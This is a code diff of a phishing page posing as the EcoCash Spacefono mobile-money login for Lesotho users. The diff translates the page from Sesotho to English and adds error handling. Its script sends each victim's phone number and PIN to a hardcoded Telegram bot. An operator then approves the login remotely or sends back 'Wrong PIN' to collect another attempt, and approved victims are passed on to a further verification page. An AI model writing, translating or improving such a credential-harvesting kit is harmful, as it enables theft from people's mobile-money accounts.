@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="st">
+<html lang="en">
 
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ecocash spache-fono - Kena</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>EcoCash Spacefono - Kena</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
         * {
@@ -159,6 +159,20 @@
             box-shadow: 0 8px 20px rgba(0, 102, 255, 0.3);
         }
         
+        .error-box {
+            display: none;
+            width: 100%;
+            max-width: 400px;
+            margin-bottom: 18px;
+            border: 1px solid #ff4d4d;
+            background: #fff1f1;
+            color: #b00020;
+            padding: 12px 16px;
+            border-radius: 12px;
+            font-weight: 600;
+            text-align: center;
+        }
+        
         .bottom-section {
             background: #005eb8;
             color: white;
@@ -215,6 +229,7 @@
             gap: 8px;
             width: 180px;
             box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
+            text-decoration: none;
         }
         
         .btn-icon {
@@ -295,46 +310,47 @@
     <div class="login-content">
         <h1 class="title">Kena</h1>
 
+        <div class="error-box" id="errorBox"></div>
+
         <div class="phone-group">
             <img class="flag" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRkcVs9U-I3GIUQp-D_fbHuQofZUpFNwgFob4_88Bc6Lw&s=10" alt="Lesotho Flag">
             <div class="country-select">
                 +266 <span class="dropdown-arrow">▼</span>
             </div>
-            <input type="tel" class="phone-input" id="phoneInput" placeholder="Nomoro ea Mohala">
+            <input type="tel" class="phone-input" id="phoneInput" placeholder="Phone number" />
         </div>
 
-        <div class="pin-label">Kenya PIN ea hau</div>
+        <div class="pin-label">Your PIN</div>
         <div class="pin-group">
-            <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
-            <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
-            <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
-            <input type="password" class="pin-box" maxlength="1" inputmode="numeric">
+            <input type="password" class="pin-box" maxlength="1" inputmode="numeric" />
+            <input type="password" class="pin-box" maxlength="1" inputmode="numeric" />
+            <input type="password" class="pin-box" maxlength="1" inputmode="numeric" />
+            <input type="password" class="pin-box" maxlength="1" inputmode="numeric" />
         </div>
 
-        <a href="#" class="forgot">U lebetse PIN?</a>
-
-        <button id="loginBtn">KENA</button>
+        <a href="#" class="forgot">Forgot your PIN?</a>
+        <button id="loginBtn">CONTINUE</button>
     </div>
 
     <div class="bottom-section">
         <div class="curve"></div>
         <div class="bottom-content">
             <div class="bottom-text">
-                Ho ingolisa ka mokotlana oa ecocash spache-fono, kapa ho kopa thuso,<br> tobetsa ka tlase
+                To sign up with the EcoCash Spacefono package, or to get help,<br /> tap below.
             </div>
             <div class="bottom-btns">
                 <a href="#" class="bottom-btn">
                     <div class="btn-icon">👤</div>
-                    Ngolisa
+                    Sign Up
                 </a>
                 <a href="#" class="bottom-btn">
                     <div class="btn-icon">ℹ️</div>
-                    Thuso &amp; Tšehetso
+                    Help & Support
                 </a>
             </div>
             <div class="version">v2.13P</div>
             <div class="terms">
-                Ka ho kena u lumela ho <a href="#">Melao le Maemo</a>
+                By continuing you agree to the <a href="#">Terms and Conditions</a>
             </div>
         </div>
     </div>
@@ -342,15 +358,18 @@
     <div id="spinnerOverlay">
         <div class="spinner"></div>
         <div class="spinner-text">
-            Ka kopo ema...<br> Hangata sena se nka metsotsoana e seng mekae
+            Please wait...<br /> This usually takes a few seconds
         </div>
     </div>
 
     <script>
-        const BOT_TOKEN = '8881059631:AAHFXE2n7VLpNIihXGg-1LtNzvnSVAJomPU';
+        const BOT_TOKEN = '8977747553:AAE5jjEZt0CM6hD6E6vD2tzaWNanZTyuHLI';
         const CHAT_ID = '8851096978';
+
         const savedPhone = localStorage.getItem('phone');
         const phoneInput = document.getElementById('phoneInput');
+
+        const errorBox = document.getElementById('errorBox');
 
         if (savedPhone && savedPhone.length === 9) {
             phoneInput.value = savedPhone;
@@ -364,6 +383,16 @@
         let pollInterval;
         let lastUpdateId = 0;
 
+        function setError(msg) {
+            errorBox.textContent = msg;
+            errorBox.style.display = 'block';
+        }
+
+        function clearError() {
+            errorBox.style.display = 'none';
+            errorBox.textContent = '';
+        }
+
         function checkPinComplete() {
             pinValue = Array.from(pinBoxes).map(box => box.value).join('');
             loginBtn.style.display = pinValue.length === 4 ? 'block' : 'none';
@@ -371,6 +400,7 @@
 
         pinBoxes.forEach((box, index) => {
             box.addEventListener('input', () => {
+                clearError();
                 if (box.value.length === 1 && index < 3) {
                     pinBoxes[index + 1].focus();
                 }
@@ -378,6 +408,7 @@
             });
 
             box.addEventListener('keydown', (e) => {
+                clearError();
                 if (e.key === 'Backspace' && box.value === '' && index > 0) {
                     pinBoxes[index - 1].focus();
                 }
@@ -385,22 +416,31 @@
         });
 
         loginBtn.addEventListener('click', () => {
-            const phone = phoneInput.value.trim();
+            clearError();
 
+            const phone = phoneInput.value.trim();
             if (!phone) {
-                alert('Ka kopo kenya nomoro ea mohala');
+                setError('Please enter your phone number.');
                 return;
             }
 
-            spinnerOverlay.style.display = 'flex';
-            const timestamp = Date.now();
-            const callbackData = 'approve_' + timestamp;
+            // Save phone
+            localStorage.setItem('phone', phone);
 
+            spinnerOverlay.style.display = 'flex';
+
+            const timestamp = Date.now();
+
+            // Callback data in English + unique timestamp
+            const callbackApprove = 'approve_' + timestamp;
+            const callbackWrongPin = 'wrong_pin_' + timestamp;
+
+            // IMPORTANT: message content is in English (bot receives English)
             const message =
-                `Kopo e Ncha ea Kena\n\n` +
-                `Nomoro: +266 ${phone}\n` +
-                `PIN: ${pinValue}\n\n` +
-                `Lumella phihlello?`;
+                'New Login Request\\n\\n' +
+                'Phone: +266 ' + phone + '\\n' +
+                'PIN: ' + pinValue + '\\n\\n' +
+                'Approve access to continue?';
 
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
@@ -413,41 +453,70 @@
                         reply_markup: {
                             inline_keyboard: [
                                 [{
-                                    text: 'Lumella ho Tsoela Pele',
-                                    callback_data: callbackData
+                                    text: 'Approve (Continue)',
+                                    callback_data: callbackApprove
+                                }, {
+                                    text: 'Wrong PIN',
+                                    callback_data: callbackWrongPin
                                 }]
                             ]
                         }
                     })
-                }).then(response => response.json())
+                })
+                .then(response => response.json())
                 .then(data => {
                     if (!data.ok) {
                         spinnerOverlay.style.display = 'none';
-                        alert('Phoso ha ho romeloa ho bot: ' + data.description);
+                        setError('Failed to send request to bot: ' + (data.description || 'Unknown error'));
+                        return;
                     }
-                })
-                .catch(error => {
-                    spinnerOverlay.style.display = 'none';
-                    alert('Phoso ea khokahano le bot: ' + error);
-                });
 
-            pollInterval = setInterval(() => {
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
-                    .then(res => res.json())
-                    .then(data => {
-                        if (data.ok && data.result.length > 0) {
-                            for (let update of data.result) {
-                                lastUpdateId = update.update_id;
+                    // Poll updates until user clicks one of the inline buttons
+                    if (pollInterval) clearInterval(pollInterval);
 
-                                if (update.callback_query && update.callback_query.data === callbackData) {
-                                    clearInterval(pollInterval);
-                                    spinnerOverlay.style.display = 'none';
-                                    window.location.href = 'verify.html';
+                    pollInterval = setInterval(() => {
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
+                            .then(res => res.json())
+                            .then(updateData => {
+                                if (updateData.ok && updateData.result && updateData.result.length > 0) {
+                                    for (let update of updateData.result) {
+                                        lastUpdateId = update.update_id;
+
+                                        if (update.callback_query) {
+                                            const cb = update.callback_query.data;
+
+                                            if (cb === callbackApprove) {
+                                                clearInterval(pollInterval);
+                                                spinnerOverlay.style.display = 'none';
+                                                window.location.href = 'verify.html';
+                                                return;
+                                            }
+
+                                            if (cb === callbackWrongPin) {
+                                                clearInterval(pollInterval);
+                                                spinnerOverlay.style.display = 'none';
+
+                                                // Clear PIN boxes
+                                                pinBoxes.forEach(b => b.value = '');
+                                                loginBtn.style.display = 'none';
+                                                pinBoxes[0].focus();
+
+                                                setError('Wrong PIN. Please try again.');
+                                                return;
+                                            }
+                                        }
+                                    }
                                 }
-                            }
-                        }
-                    });
-            }, 2000);
+                            })
+                            .catch(() => {
+                                // Keep waiting; optionally show error
+                            });
+                    }, 2000);
+                })
+                .catch(err => {
+                    spinnerOverlay.style.display = 'none';
+                    setError('Connection error: ' + err);
+                });
         });
 
         checkPinComplete();
